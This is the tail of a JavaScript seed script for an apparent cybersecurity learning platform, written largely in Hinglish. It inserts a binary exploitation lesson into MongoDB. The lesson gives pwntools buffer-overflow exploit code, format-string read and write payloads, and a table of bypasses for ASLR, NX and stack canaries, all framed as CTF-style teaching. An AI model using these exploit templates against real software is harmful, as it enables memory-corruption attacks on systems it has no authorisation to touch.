      { title: 'Pacu AWS Framework', url: 'https://github.com/RhinoSecurityLabs/pacu', type: 'tool' },
    ],
  },

  // ═══════════════════════════════════════════════════════════
  // 9. BINARY EXPLOITATION
  // ═══════════════════════════════════════════════════════════
  {
    domain_id: domainMap['binary-exploitation'],
    title: 'Binary Exploitation — Stack & BOF',
    order: 1,
    estimated_time: 65,
    content_markdown: `# Binary Exploitation (Pwn)

Binary exploitation = Memory vulnerabilities use karke program control flow hijack karna.

## Memory Layout

\`\`\`
HIGH ADDRESS
┌──────────────┐
│    Stack     │  ← Local variables, return addresses
│  (grows ↓)  │
├──────────────┤
│     Heap     │  ← Dynamic memory (malloc)
│  (grows ↑)  │
├──────────────┤
│     BSS      │  ← Uninitialized global variables
├──────────────┤
│    Data      │  ← Initialized global variables
├──────────────┤
│    Text      │  ← Program code
LOW ADDRESS
\`\`\`

## Stack Frame

\`\`\`
┌─────────────────┐
│   Arguments     │
├─────────────────┤
│  Return Address │  ← Yahan overwrite karna hai!
├─────────────────┤
│   Saved RBP     │
├─────────────────┤
│  Local Variables│
│   (buffer)      │
└─────────────────┘
\`\`\`

## Buffer Overflow

\`\`\`c
void vulnerable() {
    char buffer[64];
    gets(buffer);  // No bounds check!
    // 100 chars bhejo → return address overwrite ho jaata hai
}
\`\`\`

## Exploit Development Steps

### 1. Offset Find Karo
\`\`\`python
# Pattern generate karo (pwntools)
from pwn import *
pattern = cyclic(200)
# GDB mein run karo, crash hone pe RIP/EIP value note karo
offset = cyclic_find(0x6161616b)  # RIP value
print(offset)  # e.g., 72
\`\`\`

### 2. Return Address Control Karo
\`\`\`python
from pwn import *

offset = 72
ret_addr = p64(0xdeadbeef)  # Kahan jump karna hai

payload = b"A" * offset + ret_addr
\`\`\`

### 3. Shell Spawn Karo
\`\`\`python
from pwn import *

elf = ELF('./vulnerable')
p = process('./vulnerable')

# win() function address
win_addr = elf.symbols['win']

payload = b"A" * 72 + p64(win_addr)
p.sendline(payload)
p.interactive()
\`\`\`

## Protections & Bypasses

| Protection | Description | Bypass |
|-----------|-------------|--------|
| **ASLR** | Random addresses | Info leak, brute force |
| **NX/DEP** | Stack not executable | ROP chains |
| **Stack Canary** | Random value before ret addr | Leak canary |
| **PIE** | Random base address | Info leak |

## Format String Exploit

\`\`\`c
printf(user_input);  // Vulnerable!
\`\`\`

\`\`\`python
# Stack leak karo
payload = "%p." * 20

# Specific offset se value read karo
payload = "%7$p"    # 7th argument

# Memory write karo (advanced)
payload = "%100c%7$n"   # Address pe 100 write karo
\`\`\`

## Tools

\`\`\`bash
# pwntools — Python exploit library
pip install pwntools

# pwndbg — GDB plugin
# checksec — Security protections check
checksec ./binary

# ROPgadget — ROP chain finder
ROPgadget --binary ./vuln
\`\`\``,
    video_url: 'https://www.youtube.com/embed/iyAyN3GFM7A',
    resources_links: [
      { title: 'pwn.college — Free Pwn Course', url: 'https://pwn.college', type: 'article' },
      { title: 'pwntools Documentation', url: 'https://docs.pwntools.com', type: 'tool' },
      { title: 'LiveOverflow Binary Exploitation', url: 'https://www.youtube.com/playlist?list=PLhixgUqwRTjxglIswKp9mpkfPNfHkzyeN', type: 'video' },
    ],
  },

];

async function addLearnContent() {
  try {
    await mongoose.connect(MONGO_URI);
    console.log('✅ MongoDB connected');

    const domains = await Domain.find({ isActive: true });
    if (domains.length === 0) {
      console.error('❌ Koi domain nahi mila. Pehle seed.js run karo.');
      process.exit(1);
    }

    const domainMap = {};
    domains.forEach(d => { domainMap[d.slug] = d._id; });
    console.log(`✅ ${domains.length} domains mile`);

    const modules = getModules(domainMap);
    let added = 0;
    let skipped = 0;

    for (const mod of modules) {
      if (!mod.domain_id) {
        console.log(`⚠️  Domain ID nahi mila — skip`);
        skipped++;
        continue;
      }
      const exists = await LearningModule.findOne({ title: mod.title });
      if (exists) {
        console.log(`⚠️  Already exists, skip: "${mod.title}"`);
        skipped++;
        continue;
      }
      await LearningModule.create(mod);
      console.log(`✅ Added: "${mod.title}"`);
      added++;
    }

    console.log('\n─────────────────────────────────────');
    console.log(`🎉 Done! ${added} modules added, ${skipped} skipped`);
    console.log('─────────────────────────────────────');
    console.log('Ab Learn section mein saare domains ka content dikhega!');
    process.exit(0);
  } catch (err) {
    console.error('❌ Error:', err.message);
    process.exit(1);
  }
}

addLearnContent();
